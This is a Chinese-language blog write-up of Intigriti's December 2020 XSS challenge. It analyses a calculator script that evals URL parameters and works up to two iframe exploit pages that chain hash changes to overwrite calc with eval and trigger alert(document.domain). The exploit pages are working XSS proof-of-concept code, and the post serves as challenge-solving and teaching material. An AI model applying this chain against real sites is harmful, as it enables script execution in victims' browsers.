---
layout: post
title:  Intigriti XSS Challenge-2020 Writeup
tags: [xss]
---

Intigriti's December XSS Challenge https://challenge-1220.intigriti.io/

script code
```
window.name = "Intigriti's XSS challenge";

const operators = ["+", "-", "/", "*", "="];
function calc(num1 = "", num2 = "", operator = ""){
  operator = decodeURIComponent(operator);
  var operation = `${num1}${operator}${num2}`;
  document.getElementById("operation").value = operation;
  if(operators.indexOf(operator) == -1){
    throw "Invalid operator.";
  }
  if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){
    throw "No special characters."
  }
  if(operation.length > 20){
    throw "Operation too long.";
  }
  return eval(operation);
}

function init(){
  try{
    document.getElementById("result").value = calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator"));
  }
  catch(ex){
    console.log(ex);
  }
}

function getQueryVariable(variable) {
    window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
    var vars = searchQueryString.split('&');
    var value;
    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split('=');
        if (decodeURIComponent(pair[0]) == variable) {
            value = decodeURIComponent(pair[1]);
        }
    }
    return value;
}
```

点击计算器，可以发现3个参数，同时观察代码，发现num1、num2和operator三个参数。代码很简单，获取3个参数，对3个参数判断检测，之后执行`eval(operation)`。
sink点就在这里。

由于字符数限制为20以内，即便是`alert(document.domain)`也有22个字符，并且正则判断也不能输入`().`，所以也不能直接输入。

## 尝试1
想到的第一个方法是使用`location=jscode`的方式来执行。要使用`javascript:`协议，直接num1、num2不行，因为过不了正则。有个变量是可以控制输入javascript的，就是`searchQueryString`，但是`location=searchQueryString`的长度为26，不满足。接下来就一直在寻找有没有更短的可控的变量。但是没有成功。后续看其他人的解法，也有这个思路的。不过还得用到后面的方法。

## 尝试2
试了一段时间之后，一直找不到。看了看提示，说是有非预期的交互的解法。就去试了一下，但是都需要两个步骤，而我一直想的是直接一步到位的方法。所以又卡壳了。可以覆盖函数，但是参数不能控制了。比如执行`calc=alert`，但是第二次需要自己执行`location.hash="?&num1=alert(document.domain)&operator=%3d&num2=eval"`第方式修改。

## 尝试3
既然做不出来，就去找了一下之前的xss的writeup[1][2]，发现通过iframe的方式，修改hash，并不会触发网页重新加载。这样第一次覆盖之后，第二次修改hash，就可以完成参数修改。
交互式解法是通过1）calc=eval 2）num1=alert(document.domain), 点击计算器，触发执行。

```
<html>
  <head>
  </head>
  <body>
	<iframe id= "xss" src="https://challenge-1220.intigriti.io/#?num1=calc&operator=%3d&num2=eval" width=1920 height=1080 onload="aa()"></iframe>
  </body>
 <script>   	
  		function aa(){document.getElementById('xss').src = "https://challenge-1220.intigriti.io/#?&num1=alert(document.domain)&operator=%3d&num2=eval"}
  </script>
</html>
```

## 尝试4
在有了交互式解法的基础上，如何非交互的触发呢。想到onhashchange可以通过hash修改事件触发，这样就可以自动触发。
1）onhashchange=init 2）calc=eval 3）执行eval
完美。
```
<html>
  <head>
  </head>
  <body>
	<iframe id= "xss" src="https://challenge-1220.intigriti.io/#?num1=onhashchange&operator=%3d&num2=init" width=1920 height=1080 onload="aa()"></iframe>
  </body>
 <script>   	
  		function aa(){document.getElementById('xss').src = "https://challenge-1220.intigriti.io/#?num1=calc&operator=%3d&num2=eval"}
  		setTimeout(function(e){document.getElementById('xss').src = "https://challenge-1220.intigriti.io/#?&num1=alert(document.domain)&operator=%3d&num2=eval"},15000);
  </script>
</html>
```
想要看更漂亮的解法，可以去官网找其他人的解法。
刚开始思路局限了，以为非交互的解法就是直接访问。iframe通过多次修改hash，也可以非交互触发。

[1] [intigriti xss challenge 1](https://blog.intigriti.com/2019/05/06/intigriti-xss-challenge-1/)
[2] [intigriti 10k followers xss challenge](https://www.codedbrain.com/intigriti-10k-followers-xss-challenge/)
